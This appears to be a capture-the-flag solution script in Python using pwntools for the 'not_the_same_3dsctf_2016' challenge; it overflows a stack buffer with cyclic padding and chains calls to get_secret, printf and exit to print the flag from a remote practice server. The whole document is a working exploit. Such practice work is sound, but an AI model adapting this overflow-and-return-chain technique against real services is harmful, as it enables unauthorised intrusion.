from pwn import *

context.log_level = 'debug'
io = remote('node4.buuoj.cn', 27286)
# io = process('not_the_same_3dsctf_2016')
get_secret = 0x080489A0
printf = 0x0804F0A0
flag = 0x080ECA2D
exit = 0x0804E660

# gdb.attach(io)
# pause()
payload = cyclic(0x2d) + p32(get_secret) + p32(printf) + p32(exit) + p32(flag)
io.sendline(payload)
io.recv()
io.interactive()
